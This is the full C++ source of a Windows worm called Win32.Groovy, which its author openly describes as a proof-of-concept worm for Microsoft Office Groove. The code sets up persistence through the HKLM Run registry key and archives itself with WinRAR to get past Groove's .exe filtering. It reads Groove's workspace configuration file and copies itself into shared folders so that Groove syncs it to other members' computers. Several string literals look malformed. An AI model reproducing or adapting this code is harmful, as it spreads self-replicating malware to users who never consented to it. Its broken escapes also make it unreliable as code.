   /*************************************************************
    * Win32.Groovy (01/28/2007)
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    * by free0n
    * free0n.host.sk | DoomRiderz www.doomriderz.com
    * ###########################################################
    * ++Groovy++
    * Groovy is the first Microsoft Office Groove worm. Groove
    * is a new Microsoft Office Tool that lets users share documents
    * and workspaces with other team members. Now the best part
    * about Groove is it "Automatically sends the changes you make
    * in a workspace to your team members' computers." So naturally
    * this is now a new effective spreading technique that will
    * spread our worm for us and all we have to do is dump our file
    * into a workspace! omg how cool!
    *
    * Now there is some minor security on this tool so no .exe's but
    * we can do .zip's and .rar's so to fully exploit this little
    * loophole we make our worm have the ability to rar it'self! wow
    * hard stuff... the next little challenge is getting the
    * the workspaces and path to them on the hard drive but once again
    * Microsoft made this really easy by creating us an XML file!
    * so now we can just parse the xml file and get the all the
    * paths to copy our worm. Then once the worm is copied to the folder
    * almost instantly Microsoft Groove will alert all the members
    * of the workspace and download the worm to their computers.
    * Pretty cool right?!
    *
    * So let the fun begin on hacking this cool tool. This worm
    * is not violent with no destructive payloads and no real
    * defence against a.v. but since this is like a P.O.C. it
    * shouldn't matter. I'm not out to destroy the world anyways
    * just the only p.c. that matters (mine) hehe :)
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************/
   #include <cstdlib>
   #include <iostream>
   #include <windows.h>
   #include <string.h>
   #include <stdlib.h>
   #include <tlhelp32.h>
   #include <fstream>

   using namespace std;

   //the cooolest way to startup
   void AutoRun(string path)
   {
       HKEY hKey;
       RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", &hKey);
       RegSetValueEx(hKey, "Groovy", 0, REG_SZ, (BYTE *)path.c_str(), lstrlen(path.c_str())+1);
       RegCloseKey(hKey);
   }

   //winrar our file up basically
   //grabs the winrar path from the registry
   //then executes our rar parameters and
   //creates a archive for us.
   void WinRaR(string path)
   {
       HKEY hKey;
       HWND hwnd;

       string rarKey = "Software\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe";
       unsigned char rar[1024];

       DWORD rarlen = sizeof(rar);
       char rarPath[MAX_PATH];

       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,rarKey.c_str(),0,KEY_QUERY_VALUE,&hKey) == ERROR_SUCCESS)
       {
          //remember kids always close anything u open
          //it's like when u get married you have to make sure
          //u always put the lid down after goin tinkle
          //else youre wife will cut ur u know whats off

          RegQueryValueEx(hKey,"",0,NULL,rar,&rarlen);
          RegCloseKey(hKey);
          int i = 0;
          while(rar[i] != 0) {
             rarPath[i] = rar[i];
             i++;
          }
          ShellExecute(hwnd,"open",rarPath,"a groovy.rar *.exe",NULL,SW_HIDE);
          //calling winrar like this is dumb but since we do it, we have
          //to give the program some time to execute and complete
          clock_t goal = 10000 + clock();
          while (goal > clock());
       }
   }

   //duh guess what these next two
   //functions do :)
   bool FileExists(string n)
   {
       ifstream groovy(n.c_str());
       return groovy.is_open();
   }

   string ReplaceAll(string s, string f, string r) {
     unsigned int found = s.find(f);
     while(found != string::npos) {
       s.replace(found, f.length(), r);
       found = s.find(f);
     }
     return s;
   }

   char *AppDataDir()
   {
      //hack our shell folders and grab our application data path
      //never do that lame hard coding drive shit that's dumb.

      HKEY hKey;
      char *appKey = ".DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders";
      unsigned char appData[1024];
      DWORD appLen = sizeof(appData);
      char appPath[MAX_PATH];
      if(RegOpenKeyEx(HKEY_USERS,appKey,0,KEY_QUERY_VALUE,&hKey) == ERROR_SUCCESS)
      {
        RegQueryValueEx(hKey,"Local AppData",0,NULL,appData,&appLen);
        RegCloseKey(hKey);
        int i = 0;
        while(appData[i] != 1) {
          appPath[i]=appData[i];
          i++;
        }
      }
      return appPath;
   }

   //holy mother of god!
   //string manipulation is horrible in C/C++
   //and the fact i'm not good at it doesn't help
   //but it works....
   //basically opens our passed in xml file
   //string tokens based on " " then we save
   //all the lines that have RootFolderPath into another
   //string.  then we use that replace all method
   //to replace those 2 strings and that gives us
   //our filepaths with a delimiter of a double quote "
   string ParsePaths(string path)
   {
        string line;
        ifstream grooveyFile (path.c_str());
        char findchar = '_';
        string paths = "";
        if(grooveyFile.is_open())
        {
           while(!grooveyFile.eof())
           {
              getline(grooveyFile,line);
              if(line.length() > 0 || line != "")
              {
                 int i = 0;
                 char str[line.length()];
                 while(line.length() != i)
                 {
                    str[i] = line[i];
                    i++;
                 }
                 char* rfp;
                 rfp = strtok(str," ");
                 while (rfp != NULL)
                 {
                    if(strstr(rfp,"RootFolderPath="))
                       paths += rfp;
                    rfp = strtok (NULL, " ");
                 }
              }
           }
           grooveyFile.close();
           if(paths.length() > 0 || paths != "")
           {
              //this will give us our paths in one string
              //we will leave a double quote " there to use
              //as our maker then later will just use strtok to
              //grab the paths. easy cheezy :)
              paths = ReplaceAll(paths,"_OrigRootFolderPath="","");
              paths = ReplaceAll(paths,"_RootFolderPath="","");
           }
        }
        return paths;
   }

   //we pass in our rar file and our filepaths string
   //that was returned from the method above this one
   //looks like this C:fasm"C:test"C:blah" since
   //our double quote is our delimiter we can use strtok
   //again to get the paths to copy from one by one.
   void Spread(string file, string filepaths)
   {
       int i = 0;
       char str[filepaths.length()];
       while(filepaths.length() != i)
       {
          str[i] = filepaths[i];
          i++;
       }
       char* fxs;
       fxs = strtok(str,""");
       while (fxs != NULL)
       {
           if(strstr(fxs,"\"))
           {
              string p = "";
              p += fxs;
              char* l = strrchr(fxs,'\');
              if(strlen(fxs) == (l-fxs+1))
              {
                 p += file;
                 CopyFile(file.c_str(),p.c_str(),TRUE);
              }
           }
           fxs = strtok(NULL, """);
       }
   }

   void Payload()
   {
      SYSTEMTIME time;
      GetSystemTime(&time);

      //happy 420! i did this for all the people that
      //go to hippy hill in San Francisco, hopefully
      //you'll be there and not get this message
      //but if you do, then just go to the park and groove
      //out to some greatful dead and pass some joints  :)
      //I remember how much fun it was to be out there and i miss it sooo bad :)
      //great people and great fun! do it if you ever get a chance

      if(time.wDay == 20 && time.wMonth == 4)
      {
         MessageBox(NULL,"Infected with the first Groove worm. Don't worry nothin bad happend. Isn't it just groooovy! :)","Grooovy by free0n [DoomRiderz]",MB_OK);
      }

      if(time.wDay == 16 && time.wMonth == 9)
      {
         //A sPecial Secret Message for Someone on this Day
         MessageBox(NULL,"Help sAve PeoPle other than Yourself - Burn Down the Angelic evils that haunt You","Grooovy by free0n [DoomRiderz]",MB_OK);
      }
   }

   //main program execution
   //works like this
   //1. gets our path
   //2. gets our xml path that stores all the groove repositories
   //   the groove repositories will be our destination folders for copying our worm
   //3. if xml file exists then get repositories and continue
   //4. Create a directory and dump a copy of ourself in it
   //5. Add the copy to the auto startup
   //6. If WinRaR is on the system then RaR up the directory with our .exe and continue
   //7. Check to see if we got any repository paths, if we do then copy our rar file to
   //   those paths and continue
   //8. Delete our rar file cause that would have been created in our main app directory
   //9. Then run our msgbox payload

   int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)
   {
       char me[MAX_PATH];
       GetModuleFileName(0,me,sizeof(me));

       if(FileExists("groovy.rar"))
       {
          DeleteFile("groovy.rar");
       }

       string groovey = strcat(AppDataDir(),"\Groovy");
       CreateDirectory(groovey.c_str(),NULL);
       groovey += "\groovy.exe";

       AutoRun(groovey);
       CopyFile(me,groovey.c_str(),TRUE);
       WinRaR(strcat(AppDataDir(),"\Groovy\"));

       if(FileExists("groovy.rar"))
       {
          //spread using ms office groove
          string path = strcat(AppDataDir(),"\Microsoft\Office\Groove\User\GFSConfig.xml");
          string groovePaths = ParsePaths(path);
          if(groovePaths.length() > 0)
          {
             if(FileExists("groovy.rar"))
             {
                Spread("groovy.rar", groovePaths);
                DeleteFile("groovy.rar");
                Payload();
             }
          }
       }
       return 0;
   }
